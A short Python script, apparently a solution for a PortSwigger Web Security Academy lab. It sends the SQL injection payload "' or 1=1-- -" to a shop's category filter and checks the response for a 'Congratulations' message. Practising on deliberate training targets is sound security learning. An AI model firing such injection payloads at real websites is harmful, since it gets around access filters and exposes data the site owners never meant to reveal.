import requests

# Edit the url here
url = "https://0af700fe04546dc980aaa8eb005200e0.web-security-academy.net/filter?category=" 

def exp():
    r = requests.get(url + "' or 1=1-- -")
    if "Congratulations" in r.text:
        print("Solved the labs!")
    else:
        print(r.text)

if __name__ == "__main__":
    exp()